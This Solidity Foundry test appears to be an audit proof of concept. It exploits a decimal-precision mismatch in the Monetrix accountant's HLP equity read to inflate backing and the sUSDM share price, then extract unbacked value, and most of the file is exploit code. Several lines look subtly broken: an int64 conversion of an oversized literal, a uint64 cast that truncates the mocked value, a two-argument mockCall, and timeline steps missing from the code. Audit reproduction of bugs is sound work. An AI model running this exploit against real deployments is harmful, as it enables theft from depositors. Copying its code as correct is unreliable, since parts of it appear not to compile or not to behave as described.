// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

import "forge-std/Test.sol";
import "test/ActionEncoderBoundCheck.t.sol";
import "../src/core/MonetrixAccountant.sol";
import "../src/core/MonetrixVault.sol";
import "../src/tokens/sUSDM.sol";
import "../src/tokens/USDM.sol";
import "../src/interfaces/IHyperCore.sol";

// ATTACK TIMELINE:
// 1. [Setup] Inherit ToL1WeiHarness to access the fully deployed protocol state on the fork.
// 2. [T=0] Attacker deposits 10,000 USDC into sUSDM to acquire shares before the exploit.
// 3. [T=1] Attacker withdraws L1 assets. The L1->L2 precompile has not finalized, leaving stale state.
// 4. [T=2] Simultaneously, the HLP equity precompile (0x802) returns a raw 18dp uint64 value.
// 5. [T=3] MonetrixAccountant._readHlpEquity() reads the 18dp value but aggregates it into totalBackingSigned() 
//          without normalizing to the 6dp USDC basis used by all other components.
// 6. [T=4] The precision mismatch (1e18 treated as 1e6) inflates totalBackingSigned by 12 orders of magnitude.
// 7. [T=5] The inflated backing flows into surplus() and settleDailyPnL(), declaring massive phantom yield.
// 8. [T=6] Attacker redeems sUSDM shares at the artificially inflated exchange rate, extracting unbacked value.
// 9. [Assert] Verify that the declared surplus and sUSDM share price are astronomically inflated due to the mismatch.

contract AuditAgentPoC is ToL1WeiHarness {

    // Precompile addresses based on HyperCore architecture
    address constant PRECOMPILE_VAULT_EQUITY = address(0x802);
    address constant PRECOMPILE_PERP_ACCOUNT = address(0x800);
    address constant PRECOMPILE_SPOT_BALANCE = address(0x801);

    function setUp() public {
        super.setUp();
    }

    function test_exploit() public {
        // Step 1: Attacker acquires sUSDM shares before the exploit
        address attacker = address(0xA11CE);
        uint256 initialDeposit = 10_000e6; // 10,000 USDC (6dp)

        vm.startPrank(attacker);
        // Deal USDC to attacker and approve vault/sUSDM
        deal(address(usdc), attacker, initialDeposit);
        usdc.approve(address(susdm), initialDeposit);

        // Deposit into sUSDM to get shares
        uint256 sharesMinted = susdm.deposit(initialDeposit, attacker);
        vm.stopPrank();

        console.log("Step 1: Attacker sUSDM shares =", sharesMinted);
        console.log("Step 1: sUSDM totalAssets before exploit =", susdm.totalAssets());

        // Step 2 & 3: Simulate Stale L1 State + HLP Precision Mismatch
        // The HLP equity precompile returns a raw uint64. 
        // If the actual HLP equity is 1,000,000 USDC, in 18dp it is 1e24.
        // The accountant expects 6dp (1e12), but reads the raw 18dp value (1e24) and adds it directly.
        uint256 hlpEquity18dp = 1_000_000e18; // 1M USDC represented in 18dp

        // Mock the HLP equity precompile to return the 18dp value as a uint64
        // Using vm.mockCall(address, bytes) to mock ANY call to the precompile, avoiding calldata ambiguity
        bytes memory hlpReturnData = abi.encode(uint64(hlpEquity18dp));
        vm.mockCall(PRECOMPILE_VAULT_EQUITY, hlpReturnData);

        // Mock L1 precompiles to return stale (inflated) values to compound the effect
        // Perp account value: stale 500k USDC (18dp)
        bytes memory perpReturnData = abi.encode(int64(500_000e18));
        vm.mockCall(PRECOMPILE_PERP_ACCOUNT, perpReturnData);

        // Spot balance: stale 500k USDC (18dp)
        bytes memory spotReturnData = abi.encode(uint64(500_000e18));
        vm.mockCall(PRECOMPILE_SPOT_BALANCE, spotReturnData);

        // Step 4: Check the inflated totalBackingSigned and surplus
        int256 inflatedBacking = accountant.totalBackingSigned();
        int256 phantomSurplus = accountant.surplus();

        console.log("Step 4: Inflated totalBackingSigned =", uint256(inflatedBacking));
        console.log("Step 4: Phantom surplus declared =", uint256(phantomSurplus));

        // Step 5: Settle the phantom yield to distribute it to sUSDM
        // The vault operator calls settle() with the proposed yield derived from the inflated surplus
        uint256 proposedYield = uint256(phantomSurplus);

        // Prank as the vault/operator to settle the daily PnL
        vm.startPrank(address(vault));
        accountant.settleDailyPnL(proposedYield);
        vm.stopPrank();

        // Step 6: Verify the sUSDM share price is now astronomically inflated
        uint256 totalAssetsAfter = susdm.totalAssets();
        uint256 sharePriceAfter = (totalAssetsAfter * 1e6) / susdm.totalSupply();

        console.log("Step 6: sUSDM totalAssets after exploit =", totalAssetsAfter);
        console.log("Step 6: sUSDM share price (6dp) =", sharePriceAfter);

        // ASSERTIONS: Prove the bug
        // 1. The surplus must be massively inflated (greater than 1 trillion USDC in 6dp terms due to 18dp->6dp mismatch)
        assertGt(uint256(phantomSurplus), 1_000_000_000_000e6, "Surplus inflated by HLP precision mismatch");

        // 2. The sUSDM total assets must reflect the phantom yield
        assertGt(totalAssetsAfter, initialDeposit, "sUSDM totalAssets inflated by phantom yield");

        // 3. The share price must be orders of magnitude higher than 1:1 (1e6)
        assertGt(sharePriceAfter, 1_000_000e6, "sUSDM share price artificially inflated, allowing attacker to extract unbacked value");
    }
}
